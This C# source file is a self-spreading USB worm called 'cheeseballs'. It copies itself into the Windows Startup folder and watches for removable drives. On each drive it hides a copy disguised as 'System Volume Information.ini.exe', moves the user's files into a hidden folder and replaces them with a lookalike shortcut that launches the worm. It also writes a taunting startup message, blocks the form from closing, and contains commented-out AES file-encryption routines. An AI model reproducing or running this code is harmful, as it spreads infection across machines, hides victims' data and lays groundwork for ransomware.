using IWshRuntimeLibrary;
using System.Diagnostics;
using System.Management;
using System.Security.Cryptography;
using System.Text;
using File = System.IO.File;

namespace cheeseballs
{
    public partial class Form1 : Form
    {
        public bool IsRunningFromInfectedDrive = false;

        public Form1()
        {
            DriveInfo? drive = GetDriveByName(Path.GetPathRoot(Application.ExecutablePath)); //get the drive app is running on
            if (Path.GetFileName(Application.ExecutablePath).Contains("System Volume Information.ini.exe") && (drive == null ? false : drive.DriveType == DriveType.Removable)) IsRunningFromInfectedDrive = true;
            if (IsRunningFromInfectedDrive)
            {
                ProcessStartInfo info = new();
                info.FileName = "explorer.exe";
                info.Arguments = String.Format(@"{0} \", drive.Name);
                Process.Start(info);
                if (Process.GetProcessesByName("cheeseballs").Length > 1) Environment.Exit(31);
            }
            InitializeComponent();
        }

        readonly ManagementEventWatcher watcher = new();
        readonly WqlEventQuery query = new("SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2");
        private void Form1_Load(object sender, EventArgs e)
        {
            string autoStartPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Startup\cheeseballs.exe";
            if (!File.Exists(autoStartPath)) File.Copy(Application.ExecutablePath, autoStartPath);
            Process[] cheeseballs = Process.GetProcessesByName("cheeseballs");
            if (cheeseballs.Length > 1) Application.Exit();
            watcher.EventArrived += new EventArrivedEventHandler(Watcher_VolumeChanged);
            watcher.Query = query;
            watcher.Start();
            TryInfectAll();

            //if (Environment.UserName.Contains("Zemi")) return;
            string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\Start Menu\Programs\Startup\");
            const string scriptName = "cheeseballs.startupscript.cmd";
            string scriptPath = Path.Combine(startupPath, scriptName);
            if (File.Exists(scriptPath)) File.Delete(scriptPath);
            File.WriteAllText(scriptPath, "msg * /TIME:5 \"cihazinizi yedim afied olsun bana <33 :p\"");
        }

        private static DriveInfo? GetDriveByName(string name)
        {
            return Array.Find(GetDrives(), d => d.Name == name);
        }

        private void Watcher_VolumeChanged(object sender, EventArrivedEventArgs e)
        {
            TryInfectAll();
        }

        private static void TryInfectAll()
        {
            foreach (DriveInfo drive in GetDrives())
            {
                if (drive == null) return;
                string? appOrign = Path.GetPathRoot(Application.ExecutablePath);
                if (appOrign != null) if (drive.Name.Contains(appOrign)) return; //usb is the host of cheeseballs
                if (!drive.IsReady) return; //drive not ready
                if (IsInfected(drive)) return;
                if (KillSwitchIncluded(drive)) return;
                Infect(drive);
            }
        }

        private static bool KillSwitchIncluded(DriveInfo drive)
        {
            string switchPath = String.Format("{0}cheese.balls", drive.Name);
            if (!File.Exists(switchPath)) return false;
            else
            {
                var content = File.ReadAllText(switchPath).ToLower();
                string[] mustContain = { "dear cheese gods", "begging", "infect my usb drive", "please" };
                foreach (string s in mustContain)
                {
                    if (!content.Contains(s)) return false;
                }
                return true;
            }
        }

        private static void copyDir(string sourceDir, string destDir)
        {
            DirectoryInfo src = new DirectoryInfo(sourceDir);
            foreach (FileInfo f in src.GetFiles())
            {
                f.CopyTo(destDir + @"/" + f.Name, true);
            }
            foreach (DirectoryInfo d in src.GetDirectories())
            {
                Directory.CreateDirectory(destDir + @"/" + d.Name);
                copyDir(d.FullName, destDir + @"/" + d.Name);
            }
        }

        private static void Infect(DriveInfo drive)
        {
            try
            {
                DirectoryInfo encryptedFileContainer = Directory.CreateDirectory(String.Format(@"{0} \", drive.Name));
                DirectoryInfo copyContainer = Directory.CreateDirectory(String.Format(@"{0}System Volume Information \", drive.Name));
                ApplyFolderIcon(encryptedFileContainer.FullName, @"C:\Windows\System32\SHELL32.dll,79");
                var self = new FileInfo(Application.ExecutablePath);
                var self_name = Path.GetFileName(self.FullName);
                var selfDir = Path.GetDirectoryName(Application.ExecutablePath);
                copyDir(selfDir, String.Format(@"{0}System Volume Information \", drive.Name));
                File.Move(String.Format(@"{0}System Volume Information \{1}", drive.Name, self_name), String.Format(@"{0}System Volume Information \System Volume Information.ini.exe", drive.Name));
                var copy = new FileInfo(String.Format(@"{0}System Volume Information \System Volume Information.ini.exe", drive.Name));
                copy.Attributes = (FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
                copyContainer.Attributes = (FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);

                string key = GetEncryptionKeyFromDrive(drive);
                foreach (string filePath in Directory.GetFiles(String.Format(@"{0}", drive.Name)))
                {
                    if (filePath.Contains("System Volume Information") || filePath.Contains("desktop.ini")) continue;
                    string newPath = String.Format(@"{0} \{1}", drive.Name, Path.GetFileName(filePath));
                    File.Move(filePath, newPath);
                    //EncryptFile(new FileInfo(newPath), key);
                }
                foreach (string directoryPath in Directory.GetDirectories(String.Format(@"{0}", drive.Name)))
                {
                    if (directoryPath.Contains("System Volume Information") || new DirectoryInfo(directoryPath).Name == " ") continue;
                    string newPath = String.Format(@"{0} \{1}", drive.Name, new DirectoryInfo(directoryPath).Name);
                    Directory.Move(directoryPath, newPath);
                    //EncryptDirectory(new DirectoryInfo(newPath), key);
                }
                encryptedFileContainer.Attributes = (FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
                string notePath = String.Format(@"{0} ", drive.Name);
                //File.WriteAllText(notePath, "cheese.balls, gotem.");
                //File.SetAttributes(notePath, FileAttributes.System | FileAttributes.ReadOnly | FileAttributes.Hidden);
                string shortcutPath = String.Format("{0}{1} ({2}).lnk", drive.Name, drive.VolumeLabel, FormatBytes(drive.TotalSize));
                string targetPath = copy.FullName;

                CreateShortcut(shortcutPath, targetPath, @"C:\Windows\System32\SHELL32.dll,79");
            }
            catch
            {

            }
        }

        private static string FormatBytes(long bytes)
        {
            string[] Suffix = { "B", "KB", "MB", "GB", "TB" };
            int i;
            double dblSByte = bytes;
            for (i = 0; i < Suffix.Length && bytes >= 1024; i++, bytes /= 1024)
            {
                dblSByte = bytes / 1024.0;
            }

            return String.Format("{0:0.##} {1}", dblSByte, Suffix[i]);
        }

        private static void CreateShortcut(string path, string targetPath, string iconPath, string description = "")
        {
            WshShell shell = new WshShell();
            string shortcutAddress = path;
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutAddress);
            shortcut.Description = description;
            shortcut.TargetPath = targetPath;
            shortcut.IconLocation = iconPath;
            shortcut.Save();
        }

        private static void EncryptFile(FileInfo file, string key)
        {
            byte[] bytes = File.ReadAllBytes(file.FullName);
            string? allText = bytes.ToString();
            if (allText == null)
            {
                MessageBox.Show("skipping a file");
                return;
            }
            string encrypted = AesOperation.EncryptString(key, allText);
            string newPath = file.FullName + ".cheeseballs";

            File.Move(file.FullName, newPath);
            File.WriteAllText(newPath, encrypted);
        }

        private static void EncryptDirectory(DirectoryInfo directory, string key)
        {
            foreach (string innerFile in Directory.GetFiles(directory.FullName))
            {
                EncryptFile(new FileInfo(innerFile), key);
            }
            foreach (string innerDirectory in Directory.GetDirectories(directory.FullName))
            {
                EncryptDirectory(new DirectoryInfo(innerDirectory), key);
            }
        }

        private static string GetEncryptionKeyFromDrive(DriveInfo drive)
        {
            return CreateMD5(drive.VolumeLabel + drive.TotalSize.ToString() + drive.Name);
        }

        private static void ApplyFolderIcon(string targetFolderPath, string iconFilePath)
        {
            var iniPath = Path.Combine(targetFolderPath, "desktop.ini");
            if (File.Exists(iniPath))
            {
                //remove hidden and system attributes to make ini file writable
                File.SetAttributes(
                   iniPath,
                   File.GetAttributes(iniPath) &
                   ~(FileAttributes.Hidden | FileAttributes.System));
            }

            //create new ini file with the required contents
            var iniContents = new StringBuilder()
                .AppendLine("[.ShellClassInfo]")
                .AppendLine($"IconResource={iconFilePath}")
                .ToString();
            File.WriteAllText(iniPath, iniContents);

            //hide the ini file and set it as system
            File.SetAttributes(
               iniPath,
               File.GetAttributes(iniPath) | FileAttributes.Hidden | FileAttributes.System);
            //set the folder as system
            File.SetAttributes(
                targetFolderPath,
                File.GetAttributes(targetFolderPath) | FileAttributes.System);
        }

        public static string CreateMD5(string input)
        {
            using MD5 md5 = MD5.Create();
            byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
            byte[] hashBytes = md5.ComputeHash(inputBytes);
            return Convert.ToHexString(hashBytes);
        }

        private static bool IsInfected(DriveInfo drive)
        {
            return File.Exists(String.Format(@"{0}System Volume Information \System Volume Information.exe", drive.Name));
        }

        private static DriveInfo[] GetDrives()
        {
            return Array.FindAll(DriveInfo.GetDrives(), d => d.DriveType == DriveType.Removable);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }
}